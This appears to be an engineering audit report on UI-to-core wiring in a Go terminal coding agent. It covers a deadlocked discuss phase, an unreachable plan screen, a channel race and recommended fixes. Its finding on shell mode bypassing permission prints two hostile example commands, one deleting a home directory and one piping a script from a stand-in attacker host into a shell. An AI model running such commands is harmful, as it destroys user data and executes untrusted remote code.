# M31A TUI ↔ Core Wiring Audit Report

> **Date:** 2026-06-02
> **Scope:** End-to-end wiring audit of the Bubble Tea TUI, the main core (`cmd/m31a`), the workflow engine, the tool dispatcher, the provider layer, and the session/ledger subsystems.
> **Method:** Read every production file in `internal/tui/`, `internal/workflow/`, `internal/tools/`, `internal/provider/`, `cmd/m31a/`, and the supporting `pkg/` packages. Trace every `tea.Msg` lifecycle, every screen transition, every cross-package dependency, and every goroutine that flows into the event loop. Confirm with `go build`, `go vet`, and `go test`.

---

## 1. Executive Summary

**Overall Wiring Health: PARTIALLY_PLUGGED with one critical dead-end**

The audit done in `walkthrough_wiring_0_8.md` flagged 13 wiring issues. **Most of those are now fixed**: the command registry, streaming pipeline, `SettingsSavedMsg` handler, provider fallback, and workflow engine auto-advance are all properly wired and reachable. The build is clean, `go vet` is clean, and tests pass.

However, a fresh audit reveals **four new wiring problems** that the previous report did not catch because they live behind `WorkflowPhase` transitions rather than message types:

1. **The Discuss phase is a deadlock** — the engine returns clarifying questions, the TUI stores them in a struct field, and then the workflow hangs. The user is never prompted, no answer is ever submitted back to the engine, and the workflow never advances to Plan.
2. **The Plan screen is unreachable in the auto-advance flow** — `PlanModel` is created but `m.screen` is never set to `ScreenPlan`; the Plan screen is only ever rendered by explicit test setup.
3. **PlanModel never receives a `WindowSizeMsg`** so it stays at `0×0` and renders "Loading plan..." forever in any non-test code path.
4. **The workflow runs 5 phases back-to-back in goroutines** while only the *first* one owns `m.msgChan`; the message drainer gets orphaned after the first phase result.

There is also a structural concern: `AppState` is a 1694-line god object with 35+ dependency fields, and `AppState.Update()` is a single 950-line switch. The wiring works, but the next wiring bug will be very hard to find.

| Area | Status | Notes |
|------|--------|-------|
| Build (`go build`, `go vet`) | ✅ Clean | CGO_ENABLED=0 binary builds |
| TUI tests | ✅ Pass | `go test ./internal/tui/...` 0.43s |
| Workflow tests | ✅ Pass | `go test ./internal/workflow/...` 0.57s |
| Main → AppState bootstrap | ✅ Wired | `cmd/m31a/main.go:189` creates `tui.NewApp` with registry, key, config path |
| AppState struct wiring | ✅ All fields populated | NewApp() is comprehensive |
| **Discuss phase Q&A** | ❌ **DEAD-END** | Questions stored, never displayed, never answered |
| **Plan screen reachability** | ❌ **UNREACHABLE** | PlanModel built but screen not set |
| Workflow → TUI msg bus | ⚠️ Race-prone | msgChan is replaced mid-flight; back-to-back RunPhaseCmd |
| Screen transitions (auto-advance) | ⚠️ Wrong semantics | Plan screen skipped, Execute/Verify/Ship flash |
| Command registry | ✅ Wired | `app.go:715` `m.cmdRegistry.Execute(...)` |
| Streaming pipeline | ✅ Wired | `repl.go:497` calls `StartStreamCmd` |
| `SettingsSavedMsg` | ✅ Wired | `app.go:1122` handler |
| Provider fallback (StreamErrorMsg) | ✅ Wired | `app.go:895-933` detects 429/503, emits `FallbackEventMsg` |
| Provider fallback (`FindFallbackProvider`) | ✅ Called | `app.go:913` |
| `SettingsSavedMsg` → settingsModel.SetTheme | ✅ Fixed | `app.go:1201-1203` |
| KeyRegistry.Handle() | ✅ Wired | `app.go:504` (was dead per H4) |
| Stream cancellation leak (C1) | ✅ Fixed | `repl.go:758-774` watches `streamDone` + `streamCtx` |
| Question flow (AskUserQuestion tool) | ✅ Wired | Listener re-armed in every screen case |
| Permission modal | ✅ Wired | `app.go:935-953`, listener re-armed |
| Slash command flow | ✅ Wired | `SlashCommandMsg` from REPL → `app.go:605` |
| `WorkflowEngine` instantiation | ✅ Wired | `initWorkflowEngine()` in NewApp |
| Session forking (/fork, /prev, /next) | ✅ Wired | `app.go:720-745` |
| Sidebar show/hide | ✅ Wired | Ctrl+B, command palette, KeyAction |
| Theme cycling | ✅ Wired | `handleKeyAction` "toggle_theme" |
| Toast notifications | ✅ Wired | `ToastMsg` in Update, `renderToast` in View |
| Diff screen | ✅ Wired | `DiffScreenMsg`, `DiffCloseMsg` |

---

## 2. Wiring Diagram (Current State)

```
                    ┌──────────────────────────────┐
                    │       cmd/m31a/main.go      │
                    │  - load config, keychain    │
                    │  - register OpenRouter/Zen  │
                    │  - resolve active provider  │
                    │  - tui.NewApp(registry,…)   │
                    └──────────────┬───────────────┘
                                   │ tea.NewProgram
                                   ▼
                    ┌──────────────────────────────┐
                    │     AppState (app.go)       │  ← 1694 lines, 35 fields
                    │  - registry, dispatcher     │
                    │  - workflowEngine           │
                    │  - plan/execute/verify/ship │
                    │  - cmdRegistry, keyRegistry │
                    │  - repl, settings, resume   │
                    │  - sidebar, cmdPalette      │
                    └──────────────┬───────────────┘
                                   │
            ┌──────────┬──────────┼──────────┬──────────────┐
            ▼          ▼          ▼          ▼              ▼
        ScreenREPL  ScreenSet  ScreenMod  ScreenResume   Workflow
        (repl.go)   (settings) (selector)                Engine
            │          │          │          │              │
            │  SlashCommandMsg   │          │              │
            └──────────┬─────────┴──────────┘              │
                       ▼                                    │
              cmdRegistry.Execute                           │
                  │                                         │
                  ├─ /settings, /resume, /models           │
                  ├─ /phase, /plan, /execute, etc.         │
                  │     └─► RunPhaseCmd ──► m.workflowEngine
                  │                                         │
                  └─ all other 28 commands                 │
                                                               
   StreamMsg ←── repl.go:497 StartStreamCmd ──► Provider.LLMProvider
   StreamDoneMsg                                                   
   StreamErrorMsg ──► app.go:895 fallback path → FallbackEventMsg
                                                                    
   QuestionRequestMsg ←── dispatcher.QuestionRequestCh()
   QuestionResponseMsg ──► dispatcher.QuestionResponseCh() ──► tool
                                                                    
   PermissionRequestMsg ←── dispatcher.RequestCh()                   
   PermissionResponseMsg ──► dispatcher.ApprovePermission()         
                                                                    
   TaskStartMsg, TaskUpdateMsg, PlanReadyMsg, PhaseResultMsg ←── engine
```

---

## 3. Fixed Since Last Audit (verified)

| ID | Previous Status | Current State | Evidence |
|----|----------------|---------------|----------|
| W-01 Command registry | `dead_registry` — never instantiated | ✅ `app.go:193` `app.cmdRegistry = DefaultCommands()`, used `app.go:715` | All 28 commands reachable via `SlashCommandMsg` |
| W-02 Workflow engine | `disconnected_subsystem` | ✅ `app.go:225` `app.initWorkflowEngine()` in `NewApp`; `app.go:675,690` trigger via `/phase` and `/workflow` | Engine instantiated for every session |
| W-03 Streaming pipeline | `missing_emission` | ✅ `repl.go:497` `cmd := StartStreamCmd(ctx, p, req, …)` | Streaming works for all real LLM calls |
| W-04 Provider fallback | `missing_emission` | ✅ `app.go:895-933` `case StreamErrorMsg:` invokes `FindFallbackProvider` and emits `FallbackEventMsg` | `app_test.go:170` tests this path |
| W-05 SettingsSavedMsg | `dropped_message` | ✅ `app.go:1122-1165` — handles config reload, provider switch, model switch, ticker restart | Handler also restarts health/cache tickers |
| W-06 ScreenPlan | `unreachable_screen` | ⚠️ **Still unreachable in auto-advance** (see Issue #2 below) | Only test code sets `m.screen = ScreenPlan` (`app_test.go:851,968`) |
| W-07 ScreenExecute | `unreachable_screen` | ⚠️ Set briefly on Execute phase result, then immediately replaced when Verify phase starts | `app.go:1077` then `app.go:1086` |
| W-08 ScreenVerify | `unreachable_screen` | ⚠️ Same — flashes for one frame | `app.go:1086` then `app.go:1114` |
| W-09 ScreenShip | `unreachable_screen` | ✅ Reachable and stays | `app.go:1114` is terminal |
| W-10 HealthUpdateMsg | `missing_emission` | ✅ Removed from AppMsg struct (still in types but unused) | `types.go:37` |
| W-11 ProviderSwitchMsg | `missing_emission` | ✅ Removed (no references) |  |
| W-12 Inline `/commands` | `bypassed_registry` | ✅ All `/settings`, `/resume`, `/models` go through the inline case in `app.go:613-630`, then `/phase` aliases through inline case, then everything else through registry at `app.go:715` | Clean fallback chain |
| W-13 ReplModel provider access | `incompatible_patterns` | ✅ ReplModel has `registry`, `activeProvider`, `activeModel`, `sessionID`, `cfg`, `dispatcher` fields — set via `SetProvider()` / `SetDispatcher()` | Streaming fully wired |

Additional fixed issues from `tui_deep_test_report.md`:

| ID | Previous Status | Current State | Evidence |
|----|----------------|---------------|----------|
| C1 Goroutine leak on Ctrl+C | `critical_bug` | ✅ `repl.go:758-774` continuation cmd watches `streamDone` and `streamCtx.Done()` | No leak |
| C2 Theme not propagated to settings | `critical_bug` | ✅ `app.go:1201-1203` `m.settingsModel.SetTheme(t)` | All sub-models get theme |
| H4 Dead `KeyRegistry.Handle()` | `high_bug` | ✅ `app.go:504` `m.keyRegistry.Handle(msg.String(), ctx)` (only for `ScreenREPL`) | Chords work in REPL |

---

## 4. Critical Wiring Issues (NEW findings)

### Issue #1 — Discuss Phase Dead-End (CRITICAL)

**File:** `internal/tui/app.go:1041-1057` (case `PhaseDiscuss`)
**File:** `internal/workflow/discuss.go:49-54` (returns `NeedsAnswers: true`)
**File:** `internal/workflow/engine.go:231-265` (`SubmitDiscussAnswer`, `FinalizeDiscuss` exist but never called)

**The flow:**

1. User runs `/workflow build me a REST API in Go`.
2. AppState creates workflow goroutine via `RunPhaseCmd(m, PhaseInitialize, goal)`.
3. Initialize completes → `PhaseResultMsg` → auto-advances to `PhaseDiscuss`.
4. Discuss goroutine calls `e.runDiscuss(ctx, goal)` which:
   - Streams LLM
   - Parses 2-4 questions from the response (`parseQuestions`)
   - Stores them in `e.discussState.Questions`
   - Returns `PhaseResult{Phase: PhaseDiscuss, Success: true, NeedsAnswers: true, Messages: [assistant content]}`
5. AppState receives `PhaseResultMsg` with `NeedsAnswers: true`:
   ```go
   // app.go:1043-1054
   m.discussQuestions = make([]string, 0, len(msg.Messages))
   for _, msg2 := range msg.Messages {
       if msg2.Role == "assistant" {
           m.discussQuestions = append(m.discussQuestions, msg2.Content)
       }
   }
   if msg.NeedsAnswers {
       m.currentPhase = types.PhaseDiscuss
       m.screen = ScreenREPL
       return m, nil  // ← no return cmd!
   }
   ```
6. The questions are **stored in `m.discussQuestions` but never displayed** in the REPL.
7. The user is never prompted via the `QuestionRequestMsg` flow.
8. There is no way for the user to:
   - Submit answers to the engine
   - Call `engine.SubmitDiscussAnswer(index, answer)` (exists but unreachable from TUI)
   - Call `engine.FinalizeDiscuss()` (exists but unreachable)
   - Re-trigger `RunPhaseCmd(m, PhasePlan, goal)`
9. The workflow hangs in PhaseDiscuss forever. `m.workflowRunning` is `true` indefinitely.

**Evidence the engine primitives exist but are unused:**
```
$ grep -rn "SubmitDiscussAnswer\|FinalizeDiscuss" --include="*.go" | grep -v _test.go
(no matches outside test files)
```

**Why this is critical:**
- The Discuss phase is the *only* place where the user's goal gets refined into actionable requirements.
- A hallucinated or off-target goal goes directly from Initialize to Plan to Execute with no user review.
- The comment in `discuss.go:44-48` even says: *"TUI handles Q&A collection, then calls SubmitDiscussAnswer/SkipDiscuss"* — but the TUI never does this.

**How to fix:**

```go
// In app.go:1041 PhaseDiscuss case, replace:
if msg.NeedsAnswers {
    // OLD: m.screen = ScreenREPL; return m, nil
    // NEW: emit a question per discuss item, collect answers, then advance
    for i, q := range m.discussQuestions {
        // Build and emit a QuestionRequestMsg for each question
        cmd := func(qIdx int, qText string) tea.Cmd {
            return func() tea.Msg {
                return QuestionRequestMsg{
                    Question:    qText,
                    Header:      fmt.Sprintf("Discuss Q%d", qIdx+1),
                    Options:     []string{}, // parsed from content if present
                    AllowCustom: true,
                    ResponseCh:  m.dispatcher.QuestionResponseCh(),
                }
            }
        }(i, q)
        return m, cmd
    }
}

// Then handle the QuestionResponseMsg in app.go:978 to call:
//   m.workflowEngine.SubmitDiscussAnswer(idx, msg.Answer)
// After all answers collected:
//   m.workflowEngine.FinalizeDiscuss()
//   return m, RunPhaseCmd(m, types.PhasePlan, m.workflowGoal)
```

A more architectural fix would be to add a dedicated `ScreenDiscuss` that shows questions in a list and lets the user answer them one at a time.

---

### Issue #2 — Plan Screen Unreachable (HIGH)

**File:** `internal/tui/app.go:1059-1072` (case `PhasePlan`)

**The flow:**

1. Discuss phase completes (or is skipped via `NeedsAnswers: false`).
2. AppState receives `PhaseResultMsg` for Plan:
   ```go
   case types.PhasePlan:
       if len(msg.Tasks) > 0 && m.planModel == nil {
           t := m.themeManager.Current()
           modelID := ""
           if m.activeModel != nil { modelID = m.activeModel.ID }
           pm := NewPlanModel(msg.Tasks, t, modelID, m.activeProvider, 0, "")
           m.planModel = pm
       }
       // Auto-advance to Execute
       m.currentPhase = types.PhaseExecute
       return m, RunPhaseCmd(m, types.PhaseExecute, m.workflowGoal)
   ```
3. `PlanModel` is created with 0×0 dimensions (no `WindowSizeMsg` ever sent to it).
4. `m.screen` is **never set to `ScreenPlan`** in this case.
5. The Plan model is created, populated, and orphaned.
6. Execute goroutine starts immediately. Tasks are dispatched. The LLM may be modifying files before the user has any chance to review the plan.

**Evidence:**
```
$ grep -n "ScreenPlan" --include="*.go" -r internal/tui | grep -v _test.go
internal/tui/types.go:19:    ScreenPlan
internal/tui/plan.go:58:        return nil, &AppMsg{Screen: ScreenExecute}
internal/tui/app.go:1343:    case ScreenPlan:
internal/tui/app.go:1467:    case ScreenPlan:

# No production code sets m.screen = ScreenPlan
```

`PlanModel.Update()` (plan.go:40-72) supports keyboard interactions (`up/k`, `down/j`, `a/A` accept, `r/R` retry, `d/D` diff preview, `tab` graph) but **none of these handlers ever fire** because the screen is never set.

`PlanModel.View()` (plan.go:74-110) renders "Loading plan..." if `m.width == 0`, which is the default state.

**Why this is high severity:**
- The Plan screen was a key V1 deliverable for user review before execution.
- Without it, malicious or hallucinated plans execute immediately against the user's codebase.
- The `m.planModel` allocation in `app.go:1060-1068` is dead code.

**How to fix:**

```go
// In app.go:1059 PhasePlan case:
case types.PhasePlan:
    if len(msg.Tasks) > 0 && m.planModel == nil {
        t := m.themeManager.Current()
        pm := NewPlanModel(msg.Tasks, t, m.activeModelID(), m.activeProvider, 0, "")
        pm.width = m.width   // <- propagate current window size
        pm.height = m.height
        m.planModel = pm
    }
    if m.planModel != nil {
        m.screen = ScreenPlan  // <- show the plan screen
        return m, nil
    }
    // No tasks — skip ahead
    m.currentPhase = types.PhaseExecute
    return m, RunPhaseCmd(m, types.PhaseExecute, m.workflowGoal)
```

And update the `PlanModel.Update` to return `AppMsg{Screen: ScreenExecute}` on 'a' to actually advance (it already does — `plan.go:58`).

---

### Issue #3 — Execute/Verify/Ship Screens Flash (MEDIUM)

**File:** `internal/tui/app.go:1074-1116` (cases `PhaseExecute`, `PhaseVerify`, `PhaseShip`)

**The flow:**

```go
case types.PhaseExecute:
    t := m.themeManager.Current()
    m.executeModel = NewExecuteModel(msg.Tasks, t)
    m.screen = ScreenExecute  // ← Set
    // Transition to Verify phase immediately
    m.currentPhase = types.PhaseVerify
    return m, RunPhaseCmd(m, types.PhaseVerify, m.workflowGoal)  // ← fires immediately

case types.PhaseVerify:
    t := m.themeManager.Current()
    results := make(map[int]workflow.VerificationResult)
    m.verifyModel = NewVerifyModel(msg.Tasks, results, t)
    m.screen = ScreenVerify  // ← Overwritten 100ms later
    m.currentPhase = types.PhaseShip
    return m, RunPhaseCmd(m, types.PhaseShip, m.workflowGoal)
```

The Execute screen is set, but the next `RunPhaseCmd` returns immediately, the verify phase runs, and the screen is replaced. The user sees a flash of each screen, not a workflow.

**Why this is medium severity:**
- Execute phase is the longest phase (could be many minutes). The user does see this screen.
- Verify phase is short (file checks, build, tests) — flashes by.
- Ship phase is the terminal — user sees it.

**How to fix:**

The Execute screen's `Update()` already supports `s/S` to skip and a check for `allDone` that transitions to Verify (execute.go:73-75). The auto-advance should only happen after the user presses a key (e.g. 'p' for proceed), or after the ExecuteModel's `allDone` is true. Currently, the engine's completion message is what triggers advance, not the model's own state.

A cleaner design: after Execute phase completes, **stop the auto-advance and let the user navigate the screen** (similar to Plan). The engine goroutine should wait for the user to confirm.

---

### Issue #4 — msgChan is Replaced Mid-Flight (HIGH)

**File:** `internal/tui/app.go:328-402` (`RunPhaseCmd` and `workflowMsgDrainer`)

**The flow:**

1. `RunPhaseCmd` is called for PhaseInitialize. It creates a new `msgCh`, sets `m.msgChan = msgCh`, and returns a batch of `runner` + `workflowMsgDrainer(app)`.
2. The runner executes the phase. The drainer reads messages one at a time and the Update loop re-arms it via `return m, workflowMsgDrainer(m)`.
3. The runner completes and returns `PhaseResultMsg`. The handler at `app.go:1022` **immediately calls `RunPhaseCmd(m, PhaseDiscuss, goal)`**.
4. New `msgCh` created. Old `msgCh` is set to `app.msgChan = nil` (line 335).
5. The drainer for the old `msgCh` sees `app.msgChan == nil` and returns `nil` (line 393-394). But there may still be un-consumed messages in the old channel.
6. The runner from the new `RunPhaseCmd` is in a fresh goroutine, writing to the new channel.

**Problems:**

a) **Messages dropped**: The old runner may still be writing to the old channel after the drainer is told to stop. Those messages are lost. If the Initialize phase emitted any `PlanReadyMsg` or `TaskStartMsg` events near completion, they're gone.

b) **`eng.SetMsgEmitter(&channelEmitter{ch: msgCh})` is set to the *new* channel** in `RunPhaseCmd` (line 346), but the old `engine.msgEmitter` reference is not cleared. If anything holds a stale reference (it shouldn't, but defensive coding), it'd write to the wrong channel.

c) **No synchronization** between phase completion and drainer shutdown. There's a race window where the drainer is checking `app.msgChan == nil` and a new drainer is being created.

**Evidence:** This is not just theoretical — the workflow test runs through one phase at a time, but production code chains 5 phases back-to-back.

**How to fix:**

```go
// Add a phase generation counter:
type AppState struct {
    ...
    phaseGen int  // increment every time RunPhaseCmd is called
    msgGen   int  // captured per drainer invocation
}

func workflowMsgDrainer(app *AppState) tea.Cmd {
    return func() tea.Msg {
        app.mu.Lock()
        gen := app.phaseGen
        app.mu.Unlock()
        if app.msgChan == nil {
            return nil
        }
        select {
        case msg := <-app.msgChan:
            return msg
        case <-time.After(100 * time.Millisecond):
            // Re-check phase gen; if it changed, stop draining
            app.mu.Lock()
            if app.phaseGen != gen {
                app.mu.Unlock()
                return nil
            }
            app.mu.Unlock()
            return workflowMsgDrainer(app)()  // recurse to keep polling
        }
    }
}
```

Or simpler: use a `done chan struct{}` per phase that the drainer selects on alongside `msgChan`.

---

## 5. AppState Complexity (Architectural Concern)

`internal/tui/app.go` is **1694 lines** with:
- 35+ struct fields
- One `Update()` method of ~950 lines
- One `View()` method of ~100 lines
- 16 case branches in Update
- 12 screen-specific case branches in the second switch
- A separate `handleKeyAction` with 7 actions

This is the **core wiring problem** in the TUI. It's a god object. The `Update()` method has these distinct concerns interleaved:

1. Permission request/response
2. Question request/response
3. Stream error → fallback
4. Slash command routing (with multiple inline case layers before the registry)
5. Plan/Execute/Verify/Ship screen population from workflow results
6. Model selector selection
7. Settings save
8. Theme switching
9. Key action handling
10. Sidebar refresh
11. Toast notifications
12. Screen-specific dispatch (10 screens)

A single `Update` handler in a single function means:
- Wiring bugs (like the Discuss phase dead-end) are easy to miss
- Testing requires a fully-constructed AppState (which the tests show is brittle)
- The compiler can't help — every field is reachable from every case

**Recommendation:** Split into a `WorkflowCoordinator` that owns the engine + plan/execute/verify/ship models + auto-advance, and a `ScreenRouter` that owns screen state. The current structure has *one* place where all the bugs live.

---

## 6. Other Wiring Observations

### 6.1 Shell Mode Bypasses Permission (UNCHANGED from loophole report)

`internal/tui/repl.go:1037` — `executeShellCommand` sets `"interactive": false` which causes the dispatcher to skip the permission modal. This is intentional (user explicitly typed `!cmd`) but it does mean:

```bash
!rm -rf ~/important
!curl evil.com | sh
```

…execute with no confirmation. The loophole report's H1 was partially addressed: a comment at repl.go:1003-1004 documents that `PermissionRule` deny rules still apply, but `allow` rules with broad patterns (e.g. `**`) will match.

### 6.2 ModelSelector is a Value Type with Private Fields

`internal/tui/app.go:67` — `modelSelector ModelSelector` (value, not pointer). In `app.go:1195`:
```go
if m.modelSelector.registry != nil {
    m.modelSelector.theme = t
}
```

This works only because everything is in the same package. If `ModelSelector` is ever moved or its fields are renamed, this will silently break (no compile error from outside the package). This is a maintenance hazard.

### 6.3 Discussion Phase Questions Not Streamed

`internal/workflow/discuss.go:20` — `content, err := e.streamLLM(...)` — the LLM call is synchronous; the user sees nothing in the TUI while waiting. Compare with the streaming pipeline in REPL (which renders token-by-token). The Discuss phase can take 10-30 seconds and shows no progress.

### 6.4 SidebarShow Threshold is Hardcoded

`internal/tui/app.go:1171` — `if m.width > 120 && m.replModel != nil && !m.sidebarManuallyHidden`. Hardcoded magic number. If a user has a 119-wide terminal, they have to manually toggle.

### 6.5 No Persistence of Workflow Progress

If a user starts a `/workflow` command, gets through Plan, the engine runs Execute, and then the user closes the terminal, on next launch the session resumes with whatever state `session.json` has. But:

- `m.workflowEngine` is re-initialized in `initWorkflowEngine()` (`app.go:225` calls it from `NewApp`).
- The new engine gets a NEW session ID (line 291 `m.sessionManager.NewSession(...)`) — the original session ID is lost.
- `m.workflowGoal`, `m.discussQuestions`, `m.currentPhase` are not persisted to disk.

So workflow state is **in-memory only**. Closing the app mid-workflow abandons all progress.

### 6.6 Streaming Channels Not Closed After Stream Error

`internal/tui/streaming.go:37-138` — `StartStreamCmd` closes `streamDone` via `defer close(streamDone)`. Good. But `streamCh` is **not closed** — it's just abandoned. If the REPL re-uses the channel, garbage collection is delayed. Minor leak.

### 6.7 PlanModel's Width/Height Never Set

`internal/tui/plan.go:75` — `if m.width == 0 { return "Loading plan..." }`. The `PlanModel` is created in `app.go:1060-1068` but never receives a `WindowSizeMsg` because the screen is never set to `ScreenPlan`. So even if the user navigates there manually somehow, the plan won't render until a window resize event.

This same issue exists for `ExecuteModel`, `VerifyModel`, `ShipModel`, and `DiffModel` — they all have width/height fields that are never set during their lifecycle.

---

## 7. Tests That Should Have Caught These (But Don't)

| Test | What it tests | What it misses |
|------|---------------|----------------|
| `TestApp_PhaseResultMsg_DiscussAutoAdvances` (`app_test.go:302`) | When `NeedsAnswers: false`, auto-advances to Plan | Doesn't test the `NeedsAnswers: true` path |
| `TestApp_PhaseResultMsg_PlanAutoAdvances` (`app_test.go:321`) | Plan result auto-advances to Execute | Tests use `m.workflowEngine = nil` so the `RunPhaseCmd(m, PhaseExecute, …)` would panic in real code — the test catches the panic as expected behavior |
| `TestSettingsModel_UpdateSettingsSavedMsg` (`settings_test.go:680`) | SettingsModel handles the message | AppState handler is not tested for the actual config-reload and ticker-restart logic |
| `TestApp_StreamErrorMsg_NoFallback` (`app_test.go:463`) | No fallback for non-rate-limit errors | Doesn't test the rate-limit fallback path (the `FindFallbackProvider` invocation) |
| All `PlanModel` tests (`plan_test.go`) | PlanModel in isolation | Never tested via the auto-advance path in AppState |

**Test gap summary:** The integration tests in `app_test.go` and `screens_test.go` use the bare `m.workflowEngine = nil` pattern to avoid invoking real goroutines. This means the *actual* auto-advance logic in `app.go:1035-1116` is exercised but its side effects (calls to `RunPhaseCmd`) are never verified.

A proper test would inject a mock workflow engine that records which phase was triggered next.

---

## 8. Deviation Register

| ID | Component | Type | Severity | File:Line | Description | Expected | Actual | Impact |
|----|-----------|------|----------|-----------|-------------|----------|--------|--------|
| D-01 | Discuss phase Q&A | `dead_end` | CRITICAL | `app.go:1041-1057`, `discuss.go:49-54` | Engine returns questions; TUI stores them but never displays or collects answers | TUI shows questions via `QuestionRequestMsg`, collects answers, calls `engine.SubmitDiscussAnswer()` and `engine.FinalizeDiscuss()` | Questions stored in `m.discussQuestions`, screen set to REPL, no return cmd, no Q&A loop | Workflow hangs forever in PhaseDiscuss |
| D-02 | Plan screen | `unreachable_screen` | HIGH | `app.go:1059-1072` | After Plan phase, `m.planModel` is created but `m.screen` is never set to `ScreenPlan` | Auto-advance shows `ScreenPlan` for user review | `m.screen` stays at whatever it was; PlanModel's UI is never shown | User cannot review/reject/modify plan before execution |
| D-03 | PlanModel dimensions | `missing_init` | HIGH | `plan.go:75` | PlanModel starts with `width=0, height=0`, never receives `WindowSizeMsg` | `NewPlanModel` accepts width/height or AppState sends `WindowSizeMsg` after creation | PlanModel renders "Loading plan..." even when reachable | Plan screen never shows task list |
| D-04 | msgChan race | `data_race` | HIGH | `app.go:328-402` | `m.msgChan` is replaced when next phase starts; old drainer may miss messages or process stale ones | Synchronized drainer that uses a `done` channel or generation counter | New `msgCh` created; old drainer sees `app.msgChan == nil` and returns nil, possibly dropping intermediate `PlanReadyMsg`/`TaskStartMsg` | Workflow task progress can be lost during back-to-back phase transitions |
| D-05 | Execute/Verify flash | `unreachable_screen` | MEDIUM | `app.go:1074-1116` | Execute, Verify screens are set but immediately replaced when next phase completes | Each screen stays until user navigates or its phase truly completes | `m.screen = ScreenExecute` then `m.screen = ScreenVerify` 100ms later | Screens flash; user can interact only with Ship |
| D-06 | Workflow state non-persistent | `missing_persistence` | MEDIUM | `app.go:74-78` (struct), `initWorkflowEngine` line 225 | `m.workflowEngine`, `m.workflowGoal`, `m.currentPhase` not persisted to disk | `m.workflowGoal` and `m.currentPhase` saved to `session.json` on phase transitions | Restarting app abandons workflow | Long workflows lost on crash/close |
| D-07 | Discuss phase not streamed | `inconsistent_patterns` | MEDIUM | `workflow/discuss.go:20` | `streamLLM` is used but result consumed synchronously, no token stream to TUI | Use streaming pipeline (`StartStreamCmd`) to render tokens in REPL during Discuss | TUI shows nothing during the 10-30s wait | User can't see progress, can't cancel |
| D-08 | PlanModel field access in app.go | `tight_coupling` | LOW | `app.go:1195` | `m.modelSelector.registry` and `m.modelSelector.theme` access private fields of value-typed struct | Use setter methods: `m.modelSelector.SetTheme(t)` | Direct field access works only because same package | Fragile to refactoring |
| D-09 | Sidebar threshold hardcoded | `magic_number` | LOW | `app.go:1171` | Sidebar auto-shows when `width > 120` | Configurable threshold | Hardcoded `120` | Inconsistent behavior on 119-wide terminals |
| D-10 | StreamCh not closed | `resource_leak` | LOW | `streaming.go:36-150` | `streamCh` is created in `repl.go:495` but never closed; `streamDone` is closed | Close `streamCh` after `streamDone` | Both channels are abandoned after stream error | Minor GC delay |
| D-11 | AppState god object | `architectural_smell` | MEDIUM | `app.go:38-95, 451-1402` | 1694-line file, 35 fields, 950-line Update() | Split into WorkflowCoordinator, ScreenRouter, sub-models own their own state | All state and logic in one struct | Wiring bugs hard to find; future bugs certain |

---

## 9. Recommendations (Prioritized)

### Priority 1 — Fix Discuss Phase Dead-End (CRITICAL, ~3-4 hours)

This is a workflow blocker. Without it, the multi-phase workflow is fundamentally broken for any goal that triggers clarifying questions.

**Steps:**
1. In `app.go:1041-1057`, when `NeedsAnswers: true`, emit a `QuestionRequestMsg` for each question (or display them inline in the REPL and wait for inline answers).
2. Add a new state `m.pendingDiscussAnswers map[int]string` to collect answers.
3. Handle `QuestionResponseMsg` in `app.go:978` to call `m.workflowEngine.SubmitDiscussAnswer(idx, msg.Answer)`.
4. After all answers collected, call `m.workflowEngine.FinalizeDiscuss()` and `return m, RunPhaseCmd(m, types.PhasePlan, m.workflowGoal)`.
5. Add a timeout: if no answer within 5 minutes, auto-fill with empty answers and proceed.

Alternatively, build a dedicated `ScreenDiscuss` that shows questions in a list and accepts answers in a textarea.

### Priority 2 — Make Plan Screen Reachable (HIGH, ~1-2 hours)

**Steps:**
1. In `app.go:1059-1072`, set `m.screen = ScreenPlan` after creating `m.planModel`.
2. Propagate `m.width` and `m.height` to `PlanModel` in `NewPlanModel` or via a `SetSize` call.
3. Stop the auto-advance to Execute. The plan should require user 'A' keypress to proceed (the `PlanModel.Update()` already does this — `plan.go:57-58`).
4. Handle the resulting `AppMsg{Screen: ScreenExecute}` from `PlanModel.Update` to call `RunPhaseCmd(m, PhaseExecute, m.workflowGoal)`.

### Priority 3 — Add Drainer Synchronization (HIGH, ~1 hour)

**Steps:**
1. Add a per-phase `done chan struct{}` to the AppState.
2. In `RunPhaseCmd`, create a fresh `done` channel and pass it to the drainer.
3. The drainer selects on `msgCh`, `done`, and a timeout.
4. The `runner` closes `done` after returning its result.
5. The Update handler that processes `PhaseResultMsg` does NOT close `done` (the runner does).

### Priority 4 — Persist Workflow State (MEDIUM, ~2 hours)

**Steps:**
1. In `PhaseResultMsg` handler, write `m.workflowGoal` and `m.currentPhase` to `session.json` via `sessionManager.SaveSession(...)`.
2. In `NewApp`, after `initWorkflowEngine`, check if the active session has `currentPhase != idle` and resume from there.

### Priority 5 — Fix PlanModel Dimensions (HIGH, ~30 min)

**Steps:**
1. Change `NewPlanModel` signature to accept `width, height int`.
2. Pass `m.width, m.height` from AppState at creation.
3. Same fix for `NewExecuteModel`, `NewVerifyModel`, `NewShipModel`, `NewDiffModel`.

### Priority 6 — Stream Discuss Phase (MEDIUM, ~2-3 hours)

**Steps:**
1. Add a `StreamingMsg` channel from the engine to the TUI.
2. Have `runDiscuss` write tokens to this channel as they arrive.
3. TUI renders them in the REPL or a dedicated discuss screen.

### Priority 7 — Split AppState (MEDIUM, ~1-2 days, refactor)

**Steps:**
1. Extract `WorkflowCoordinator` that owns `workflowEngine`, `currentPhase`, `workflowGoal`, `planModel`, `executeModel`, `verifyModel`, `shipModel`, and the `PhaseResultMsg` handler.
2. Extract `ScreenRouter` that owns `screen`, `prevScreen`, and screen-specific state.
3. Extract `StreamCoordinator` that owns `replModel` streaming state and the `StreamMsg/StreamDoneMsg/StreamErrorMsg` handlers.
4. AppState becomes a thin shell that delegates to these.

This is the only sustainable path; the current 1694-line file is a wiring bug factory.

---

## 10. Build & Test Verification

```
$ CGO_ENABLED=0 go build -o /dev/null ./cmd/m31a
(no output = clean)

$ CGO_ENABLED=0 go vet ./...
(no output = clean)

$ go test -count=1 -timeout 90s ./internal/tui/...
ok  github.com/eshanized/M31A/internal/tui             0.426s
ok  github.com/eshanized/M31A/internal/tui/components  0.081s
ok  github.com/eshanized/M31A/internal/tui/theme       0.003s

$ go test -count=1 -timeout 90s ./internal/workflow/...
ok  github.com/eshanized/M31A/internal/workflow        0.570s
```

`go test -race` requires CGO_ENABLED=1; the audit was run with CGO disabled so the race detector was not exercised. The `streamCh`/`streamDone` and `msgChan` patterns in `repl.go:758` and `app.go:330-402` would benefit from a race-detector run.

